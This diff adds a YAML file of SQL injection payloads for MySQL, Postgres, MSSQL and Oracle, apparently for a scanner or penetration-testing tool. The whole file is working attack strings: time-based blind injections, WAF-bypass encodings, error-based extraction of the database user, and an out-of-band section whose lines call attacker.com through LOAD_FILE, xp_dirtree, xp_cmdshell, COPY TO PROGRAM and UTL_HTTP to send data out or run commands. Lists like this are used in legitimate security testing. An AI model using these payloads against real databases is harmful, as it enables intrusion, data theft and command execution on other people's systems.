@@ -1,0 +1,63 @@
+# payloads/sqli.yml
+# Expert-level SQLi vectors: OOB exfiltration, heavy queries, JSON escapes, and WAF bypasses
+
+time_based:
+  mysql:
+    - "' AND (SELECT * FROM (SELECT(SLEEP(10)))a)-- "
+    - "1' OR SLEEP(10)='1"
+    - "1' AND IF(1=1,SLEEP(10),0)--"
+    - "1' AND (SELECT 1 FROM (SELECT SLEEP(10))x)--"
+    - "RLIKE (SELECT (CASE WHEN (1=1) THEN SLEEP(10) ELSE 1 END))" # Regex time-based
+  postgres:
+    - "'||(SELECT pg_sleep(10))--"
+    - "1; SELECT pg_sleep(10);"
+    - "1' AND (SELECT 1 FROM pg_sleep(10))--"
+    - "1=(SELECT 1 FROM pg_sleep(10))--"
+    - "SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END"
+  mssql:
+    - "'; WAITFOR DELAY '0:0:10'--"
+    - "1' WAITFOR DELAY '0:0:10'--"
+    - "1); WAITFOR DELAY '0:0:10'--"
+    - "IF(1=1) WAITFOR DELAY '0:0:10'--"
+  oracle:
+    - "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',10)--"
+    - "BEGIN DBMS_LOCK.SLEEP(10); END;"
+
+oob_exfiltration:
+  # Out-of-Band attacks to steal data via DNS/HTTP when the target is completely blind
+  mysql:
+    - "SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\a'))"
+    - "SELECT ... INTO OUTFILE '\\\\attacker.com\\share'"
+  postgres:
+    - "COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'"
+    - "DROP TABLE IF EXISTS table_x; CREATE TABLE table_x(output text); COPY table_x FROM 'http://attacker.com/';"
+  mssql:
+    - "EXEC master..xp_dirtree '\\\\attacker.com\\share'"
+    - "EXEC master..xp_cmdshell 'ping attacker.com'"
+  oracle:
+    - "SELECT UTL_INADDR.get_host_address('attacker.com') FROM dual"
+    - "SELECT UTL_HTTP.REQUEST('http://attacker.com') FROM dual"
+
+json_and_orm:
+  # Breaking out of JSON contexts and NoSQL/ORM impedance
+  - '{"id": "1'' AND SLEEP(10)--"}'
+  - '{"id": 1}'' AND SLEEP(10)--'
+  - '{"username": "admin\\", "password": " OR SLEEP(10)--"}'
+  - '{"id": [1, "1'' OR SLEEP(10)--"]}'
+  - '{"id[$ne]": 1}' # MongoDB / ORM operator injection
+
+waf_bypass:
+  impedance_mismatch:
+    # Uses whitespace anomalies, scientific notation, and comments to break regex patterns
+    - "'%A0AND%A0SLEEP(10)--"
+    - "1'/*%00*/AND/*%00*/SLEEP(10)--"
+    - "1'/*!50000AND*//*!50000SLEEP(10)*/--"
+    - "1'%0bAND%0bSLEEP(10)--"
+    - "1e1UNION SELECT" # Scientific notation to break parsing
+    - "1' || '1'='1" # String concatenation bypass
+    - "1' %26%26 SLEEP(10)--" # URL Encoded &&
+  error_based:
+    # Extracts data directly into the error message response
+    - "1' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT user())))--"
+    - "1' AND UPDATEXML(1,CONCAT(0x5c,(SELECT user())),1)--"
+    - "1' AND CAST((SELECT user()) AS INT)--" # Postgres casting error extraction
